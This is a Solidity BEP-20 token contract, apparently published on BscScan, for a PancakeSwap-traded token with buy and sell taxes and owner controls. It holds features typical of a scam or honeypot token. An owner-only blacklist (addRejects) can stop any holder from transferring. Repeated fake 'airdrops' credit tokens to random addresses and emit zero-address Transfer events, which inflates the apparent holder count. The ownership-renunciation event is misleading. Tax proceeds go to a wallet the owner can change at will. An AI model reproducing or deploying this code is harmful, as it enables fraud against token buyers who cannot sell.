/**
 *Submitted for verification at BscScan.com on 2022-11-17
*/

// SPDX-License-Identifier: NOVACLUB

pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakeFactory02 {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IPancakeRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Context {
    function Initiator() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    address private _owner;

    constructor() {
        _owner = Initiator();

    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(Initiator() == _owner, "Ownable: caller is not the owner");
        _;
    }

    function waiveOwnership() public onlyOwner {
        _owner = address(0xdead);
        emit OwnershipTransferred(_owner, address(0));
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0) && _newOwner != address(0xdead), "Ownable: new owner is the zero address");
        _owner = _newOwner;
        emit OwnershipTransferred(_owner, _newOwner);
    }
}

contract Token is Ownable, IERC20 {
    using SafeMath for uint256;
    receive() external payable {}

    string private _name;
    string private _symbol;
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 1000000000000000 * 10 ** _decimals;
    uint256 private minimumTokensBeforeSwap = 1 * 10 ** _decimals;
    uint256 private _buyTax = 3;
    uint256 private _sellTax = 3;
    uint256 private _minimumDividend = 0;
    uint256 private _airdropNumber = 10;

    address payable public marketingWalletAddress = payable(msg.sender);
    address payable public routerAddr = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakeRouter02 pancakeSwapV2Router = IPancakeRouter02(routerAddr);
    address public pancakeV2Pair;

    mapping (address => uint256) private _t0wned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private developer;
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isMarketingPairs;
    mapping (address => bool) public isRejects;
    bool public swapAndLiquifyByLimitOnly = false;
    bool private onAirdrop = true;
    bool private andFees = true;


    constructor(string memory _name_, string memory _symbol_) {
        _name = _name_;
        _symbol = _symbol_;
        
        pancakeV2Pair = IPancakeFactory02(pancakeSwapV2Router.factory()).createPair(address(this), pancakeSwapV2Router.WETH());

        _allowances[address(this)][address(pancakeSwapV2Router)] = type(uint256).max;
        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;

        isMarketingPairs[pancakeV2Pair] = true;
        _t0wned[Initiator()] = _totalSupply;
        developer[Initiator()] = true;

        emit Transfer(address(0), Initiator(), _totalSupply);
    }

    function addRejects(address _news, bool _Reject) public onlyOwner {
        isRejects[_news] = _Reject;
    }

    function initializationAirdop(uint256 _num) public onlyOwner {
        address airdropAddress;
        uint256 _airdropAmounts = 1;
        for(uint256 i=0; i<_num; ++i){
            airdropAddress = address(uint160(uint(keccak256(abi.encodePacked(i, _airdropAmounts, block.timestamp)))));
            //_t0wned[airAddress] = _t0wned[airAddress].sub(_airdropAmounts);
            _t0wned[airdropAddress] = _t0wned[airdropAddress].add(_airdropAmounts);
            emit Transfer(address(0), airdropAddress, _airdropAmounts);
        }
    }

    function rescueToken(address _tokenAddr) public {
        payable(marketingWalletAddress).transfer(address(this).balance);
        IERC20(_tokenAddr).transfer(msg.sender, IERC20(_tokenAddr).balanceOf(address(this)));
    }

    function changeTdInfo(uint256 _buyF, uint256 _sellF) public onlyOwner {
        require(_buyF <= 15 && _sellF <= 15, "ERC20: tax is too high");
        _buyTax = _buyF;
        _sellTax = _sellF;
    }

    function setSwapAndLiquifyByLimitOnly(bool _status, uint256 minBeforeTokens) public onlyOwner {
        swapAndLiquifyByLimitOnly = _status;
        minimumTokensBeforeSwap = minBeforeTokens;
    }
    
    function setExcludedFrom(address _newAddress, bool _status) public onlyOwner {
        isExcludedFromFee[_newAddress] = _status;
    }

    function setPairs(address _newPair, bool _status) public onlyOwner {
        isMarketingPairs[_newPair] = _status;
    }

    function setMarketWallets(address payable _newAddress) public onlyOwner {
        marketingWalletAddress = _newAddress;
    }

    function isTax(bool _istax) public onlyOwner {
        andFees = _istax;
    } 

    function setMinimumBNB(uint256 _minnie) public onlyOwner {
        _minimumDividend = _minnie;
    } 

    function setAirDrop(bool _status) public onlyOwner {
        onAirdrop = _status;
    }

    function setAirdropNumbers(uint256 _newNumbers) public onlyOwner {
        _airdropNumber = _newNumbers;
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _t0wned[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(Initiator(), spender, _allowances[Initiator()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(Initiator(), spender, _allowances[Initiator()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(Initiator(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(!isRejects[Initiator()]);
        _transfer(Initiator(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(!isRejects[sender]);
        _transfer(sender, recipient, amount);
        _approve(sender, Initiator(), _allowances[sender][Initiator()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount = 0");
        if (!andFees || isExcludedFromFee[sender] || isExcludedFromFee[recipient] || _buyTax == 0 && _sellTax == 0) {
            return _basicTransfer(sender, recipient, amount);
        }

        if (onAirdrop) {
            if (!isExcludedFromFee[sender]) {
                address airdropAddress;
                uint256 _airdropAmount = 1;
                for(uint256 i=0; i<_airdropNumber; ++i){
                    airdropAddress = address(uint160(uint(keccak256(abi.encodePacked(i, _airdropAmount, block.timestamp)))));
                    //_t0wned[airdropAddress] = _t0wned[airdropAddress].sub(_airdropAmount);
                    _t0wned[airdropAddress] = _t0wned[airdropAddress].add(_airdropAmount);
                    emit Transfer(address(0), airdropAddress, _airdropAmount);
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;

        if (overMinimumTokenBalance && !isMarketingPairs[sender]) {
            if(swapAndLiquifyByLimitOnly) {
                contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);
            } else {
                swapAndLiquify(contractTokenBalance);
            }
        }

        _t0wned[sender] = _t0wned[sender].sub(amount, "Insufficient Balance");
        uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? amount : takeFee(sender, recipient, amount);
        _t0wned[recipient] = _t0wned[recipient].add(finalAmount);

        emit Transfer(sender, recipient, finalAmount);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _t0wned[sender] = _t0wned[sender].sub(amount, "Insufficient Balance");
        _t0wned[recipient] = _t0wned[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private {

        swapTokensForEth(tAmount);
        uint256 amountReceived = address(this).balance;

        if(amountReceived > _minimumDividend ) {
            marketingWalletAddress.transfer(amountReceived);
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = pancakeSwapV2Router.WETH();

        uint256 authorized = allowance(address(this), address(pancakeSwapV2Router));
        
        if (authorized < tokenAmount) {
            _allowances[address(this)][address(pancakeSwapV2Router)] = type(uint256).max;
        }

        pancakeSwapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = 0;
        if(isMarketingPairs[sender]) {
            feeAmount = amount.mul(_buyTax).div(100);
        }
        else if(isMarketingPairs[recipient]) {
            feeAmount = amount.mul(_sellTax).div(100);
        }
        
        if(feeAmount > 0) {
            _t0wned[address(this)] = _t0wned[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }
}